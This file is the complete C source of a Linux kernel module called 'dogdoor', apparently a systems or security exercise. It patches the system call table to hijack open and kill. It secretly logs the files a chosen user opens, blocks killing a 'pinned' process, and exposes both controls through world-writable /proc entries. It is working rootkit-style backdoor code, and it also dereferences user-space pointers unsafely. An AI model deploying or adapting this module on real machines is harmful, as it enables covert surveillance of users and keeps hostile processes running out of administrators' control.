#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/types.h>
#include <linux/slab.h>

#include <asm/unistd.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#define FILENAME_COUNT 10
#define FILENAME_SIZE 256

MODULE_LICENSE("GPL");

char * accessed_filenames[FILENAME_COUNT];
char user_uid[128] = "-1";
int count_accessed_filenames = 0;
char pinned_pid[16] = "-1";
void ** sctable ;

static
int is_in_filename(const char __user * filename) {
    int i;
    for (i=0; i<FILENAME_COUNT; i++) {
        if (strcmp(filename, accessed_filenames[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

static
void init_filenames(const char __user * filename) {
    if (is_in_filename(filename))
        return;
	if (count_accessed_filenames < FILENAME_COUNT) {
	    strcpy(accessed_filenames[count_accessed_filenames], filename);
	    count_accessed_filenames++;
	} else {
	    int i;
	    for (i=0; i<FILENAME_COUNT - 1; i++) {
            strcpy(accessed_filenames[i], accessed_filenames[i+1]);
	    }
	    strcpy(accessed_filenames[FILENAME_COUNT - 1], filename);
	}
}

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{
    const struct cred * my_cred = current_cred();
    int i_user_uid = (int)simple_strtol(user_uid, NULL, 10);

    if (my_cred->uid.val == i_user_uid && i_user_uid != -1) {
        init_filenames(filename);
    }

	return orig_sys_open(filename, flags, mode) ;
}

asmlinkage int (*orig_sys_kill)(int pid, int sig); 
asmlinkage int dogdoor_sys_kill(int pid, int sig)
{
    int i_current_pid = (int)simple_strtol(pinned_pid, NULL, 10);

    if (pid == i_current_pid && i_current_pid != -1) {
        printk("YOU CANNOT KILL THIS PROCESS (%d)\n", pid);
        return 1;
    }

	return orig_sys_kill(pid, sig);
}

static
ssize_t dogdoor_log_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	ssize_t toread ;
    int i;
    char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);

    strcpy(cattest, "\t[LASTLY ACCESSED FILES]\n");
    for (i=0; i<FILENAME_COUNT; i++) {
        strcat(cattest, accessed_filenames[i]);
        strcat(cattest, "\n");
    }
    toread = strlen(cattest) >= *offset + size ? size : strlen(cattest) - *offset ;
    if (copy_to_user(ubuf, cattest+ *offset, toread))
        return -EFAULT ;	
    *offset = *offset + toread ;

    kfree(cattest);
	return toread ;
}

static
ssize_t dogdoor_pid_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	ssize_t toread ;
    char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);

    strcpy(cattest, "CURRENT PID:");
    strcat(cattest, pinned_pid);
    strcat(cattest, "\n");
    toread = strlen(cattest) >= *offset + size ? size : strlen(cattest) - *offset ;
    if (copy_to_user(ubuf, cattest+ *offset, toread))
        return -EFAULT ;	
    *offset = *offset + toread ;

    kfree(cattest);
	return toread ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[256] ;
	ssize_t toread ;

    sprintf(buf, "%s", user_uid);

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	
	*offset = *offset + toread ;
	return toread ;
}

static 
ssize_t dogdoor_pid_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{ 
	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;

    sscanf(buf,"%s", pinned_pid) ;
	*offset = strlen(buf) ;
    return 0 ; 
}

static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;

	sscanf(buf,"%s", user_uid) ;
	*offset = strlen(buf) ;

	return *offset ;
}

static 
ssize_t dogdoor_log_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{ 
	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;

	/*sscanf(buf,"%s", user_uid) ;*/
	*offset = strlen(buf) ;
    return 0 ; 
}

static int proc_open(struct inode *inode, struct file *file) { return 0 ; }
static int proc_release(struct inode *inode, struct file *file) { return 0 ; }

static const struct file_operations dogdoor_log_fops = {
	.owner = 	THIS_MODULE,
	.open = 	proc_open,
	.read = 	dogdoor_log_proc_read,
	.write = 	dogdoor_log_proc_write,
	.llseek = 	seq_lseek,
	.release = 	proc_release,
} ;

static const struct file_operations dogdoor_pid_fops = {
	.owner = 	THIS_MODULE,
	.open = 	proc_open,
	.read = 	dogdoor_pid_proc_read,
	.write = 	dogdoor_pid_proc_write,
	.llseek = 	seq_lseek,
	.release = 	proc_release,
} ;

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open = 	proc_open,
	.read = 	dogdoor_proc_read,
	.write = 	dogdoor_proc_write,
	.llseek = 	seq_lseek,
	.release = 	proc_release,
} ;

static 
int __init dogdoor_init(void) {
	unsigned int level ; 
	pte_t * pte ;

    int i;
    for (i=0; i<FILENAME_COUNT; i++) {
        accessed_filenames[i] = kmalloc(FILENAME_SIZE, GFP_KERNEL);
        strcpy(accessed_filenames[i], "(EMTPY)");
    }

	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
	proc_create("dogdoor_log", S_IRUGO | S_IWUGO, NULL, &dogdoor_log_fops) ;
	proc_create("dogdoor_pid", S_IRUGO | S_IWUGO, NULL, &dogdoor_pid_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	orig_sys_kill = sctable[__NR_kill] ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;		
	sctable[__NR_open] = dogdoor_sys_open ;
    sctable[__NR_kill] = dogdoor_sys_kill ;

	return 0;
}

static 
void __exit dogdoor_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("dogdoor", NULL) ;
	remove_proc_entry("dogdoor_log", NULL) ;
	remove_proc_entry("dogdoor_pid", NULL) ;

	sctable[__NR_open] = orig_sys_open ;
	sctable[__NR_kill] = orig_sys_kill ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
